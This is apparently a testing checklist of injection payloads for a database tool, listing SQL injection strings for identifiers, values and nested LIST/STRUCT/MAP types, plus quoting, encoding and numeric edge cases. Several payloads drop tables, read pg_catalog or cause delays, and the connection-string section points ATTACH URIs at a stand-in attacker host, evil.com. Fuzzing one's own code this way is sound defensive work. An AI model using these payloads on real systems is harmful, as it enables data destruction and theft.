# Injection Payloads

Organized by category. Each payload should be tested in every applicable surface
(identifiers, string values, connection params).

## SQL Injection — Identifiers

These target table names, column names, schema names, view names, partition keys.

```
Robert'; DROP TABLE t--
" OR 1=1--
"; SELECT pg_sleep(5)--
table"name
schema.injection
my col"; DROP TABLE x--
```

## SQL Injection — String Values

These target INSERT values, UPDATE SET values, WHERE clause literals.

```
'; DROP TABLE t--
'' OR ''1''=''1
\'; DROP TABLE t--
value' UNION SELECT * FROM pg_catalog.pg_tables--
```

## Quote Escaping

```
it's
it''s
it'''s
'
''
'''
"
""
\
\\
\'
```

## NULL and Encoding

```
(NULL byte: \x00)
(overlong UTF-8: \xC0\xAF)
(replacement char: \xEF\xBF\xBD)
(BOM: \xEF\xBB\xBF)
```

## Numeric Boundary

```
9223372036854775807
-9223372036854775808
NaN
Infinity
-Infinity
1e308
```

## Nested Types (LIST/STRUCT/MAP)

These target value serialization in BuildInsertSQL.

```
[1, 2, 3]; DROP TABLE t--
['a''; DROP TABLE t--']
{'key': 'val''; DROP TABLE t--'}
MAP{'k': 'v''; DROP TABLE t--'}
[[1, 2], ['; DROP TABLE t--']]
```

## Connection String

These target ATTACH URI parameters.

```
grpc+tls://evil.com:8815
user=admin&password=x&flight_server=grpc://evil.com:8815
ducklake?user=x;DROP TABLE t--
```

## Reserved Words as Identifiers

```
select
from
where
order
group
table
index
```

## Unicode Identifiers

```
日本語テーブル
тест
🦆
emoji_🎯_table
```
